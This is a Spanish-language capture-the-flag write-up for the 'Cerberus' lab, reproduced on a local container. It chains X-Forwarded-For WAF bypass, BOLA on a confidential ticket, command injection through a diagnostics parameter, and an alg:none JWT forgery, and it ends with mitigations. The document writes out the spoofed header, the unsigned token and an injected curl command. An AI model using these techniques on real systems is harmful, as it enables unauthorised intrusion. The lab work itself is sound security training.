# Cerberus — WHOAMI-LABS.COM

**Laboratorio:** Cerberus (WHOAMI-LABS.COM)
**Categoría:** Cadena de vulnerabilidades: WAF bypass, BOLA, command injection y JWT
**Dificultad:** ★★★★★★★★ insano (8 puntos)
**Fecha:** 2026-10-31
**Estado:** resuelto
**Flag:** `Cerberus{c3rb3rus_full_ch41n_burp_m4st3r}`

## Alcance y preparación local

- Alcance autorizado: imagen local `cerberus.tar` del laboratorio Cerberus.
- Servicio local usado para la reproducción: `http://127.0.0.1:8288`, con el puerto
  interno 80 publicado sólo en loopback. El panel auxiliar se publicó en
  `127.0.0.1:8088`.
- Herramientas: `curl`, Docker y un JWT unsigned generado localmente.

## Resumen

Cerberus implementa una cadena de fallos que permite alcanzar el daemon privilegiado
desde el gateway:

1. El WAF confía en `X-Forwarded-For: 127.0.0.1` para permitir rutas internas.
2. El portal de operaciones permite consultar directamente el ticket confidencial
   `17` una vez autenticado, sin verificar autorización por objeto.
3. El ticket expone las credenciales del agente de staging.
4. El diagnóstico de staging ejecuta el parámetro `cmd` con un shell.
5. El daemon acepta JWT con `alg: none` y sólo comprueba que el rol sea
   `system_admin`.

La respuesta final del daemon devolvió la flag.

## Pasos reproducibles

1. Iniciar la imagen local en loopback:

   ```bash
   docker load -i cerberus.tar
   docker run -d --name cerberus --cap-add=NET_ADMIN \
     -p 127.0.0.1:8288:80 -p 127.0.0.1:2122:21 \
     -p 127.0.0.1:8088:8088 cerberus:latest
   ```

2. Añadir `X-Forwarded-For: 127.0.0.1` y autenticar el portal de operaciones con
   la cuenta de soporte del laboratorio. El login redirigió a
   `/portal/tickets`.
3. Consultar el ticket no listado:

   ```http
   GET /api/v2/tickets/17 HTTP/1.1
   X-Forwarded-For: 127.0.0.1
   Cookie: cerberus_session=[REDACTED]
   ```

   El JSON reveló la ruta de staging y el nombre del agente autorizado.
4. Autenticar el agente en `/staging-infra-4091/auth` y conservar la cookie de
   staging.
5. Crear localmente un JWT de tres segmentos con:

   ```json
   {"alg":"none","typ":"JWT"}
   {"role":"system_admin"}
   ```

   El último segmento quedó vacío.
6. Enviar al diagnóstico un comando que llame al daemon local:

   ```text
   curl -sS -H 'Authorization: Bearer [JWT_REDACTED]' \
     http://127.0.0.1:9090/admin/exec?action=cat_flag
   ```

   La respuesta JSON indicó `Cerberus System Compromised` y devolvió la flag.

### Esperado frente a observado

| Caso | Esperado | Observado |
| --- | --- | --- |
| Ruta interna sin confianza | `403 Forbidden` | Se permitió con `X-Forwarded-For: 127.0.0.1` |
| Ticket 17 para un operador | Denegación o filtrado por autorización | JSON confidencial accesible |
| Diagnóstico con `cmd` | Sólo lectura de logs | Ejecución arbitraria de comandos |
| JWT `alg:none` | Rechazo por firma inválida | Aceptado con rol `system_admin` |
| `/admin/exec?action=cat_flag` | Acceso administrativo protegido | Flag devuelta por el daemon |

## Evidencia

- `evidence/cerberus/01-portal-ticket.txt` — login interno y respuesta del ticket
  confidencial, con cookies y credenciales redactadas.
- `evidence/cerberus/02-staging-command.txt` — comando ejecutado por diagnóstico,
  con el JWT redactado.
- `evidence/cerberus/03-final-response.txt` — respuesta del daemon con la flag.
- `evidence/cerberus/04-validation.txt` — aceptación de la flag por el validador.

## Análisis

La cadena combina varios controles débiles:

- **Confianza indebida en headers:** el gateway usa valores controlables por el
  cliente para decidir si la petición procede de un proxy confiable.
- **BOLA:** el endpoint de tickets acepta un identificador y devuelve el objeto
  confidencial sin comprobar que el operador tenga acceso a ese ticket.
- **Command injection:** `diagnostics` pasa `cmd` a `subprocess.getoutput()`.
- **JWT inseguro:** `daemon_core.py` acepta `alg` igual a `none` sin validar una
  firma y autoriza sólo a partir del claim `role`.

- **Caja negra:** se observaron las redirecciones de login, el ticket 17, la
  respuesta de diagnóstico y la respuesta final del daemon.
- **Inspección local privilegiada:** la lectura del código del contenedor confirmó
  las rutas y condiciones descritas; sirve para explicar el comportamiento, pero no
  sustituye la evidencia HTTP.

## Validación de flag

El script oficial respondió:

```text
¡Felicitaciones! Has comprometido Cerberus.
TIEMPO TOTAL: 00h 00m 00s
```

Flag validada:

```text
Cerberus{c3rb3rus_full_ch41n_burp_m4st3r}
```

## Mitigaciones

1. Ignorar headers de identidad recibidos del cliente y aceptar sólo los que un
   proxy autenticado establezca después de eliminar los valores entrantes.
2. Aplicar autorización por objeto al consultar tickets y no devolver notas
   confidenciales a roles de soporte.
3. Eliminar la ejecución de comandos desde parámetros HTTP; si se necesitan
   diagnósticos, usar una allowlist de operaciones y argumentos.
4. Rechazar siempre `alg:none`, exigir algoritmos permitidos y validar firma,
   emisor, audiencia, expiración y rol en el servidor.
5. Rotar credenciales expuestas, invalidar sesiones afectadas y mantener el daemon
   administrativo fuera de rutas accesibles desde el gateway web.
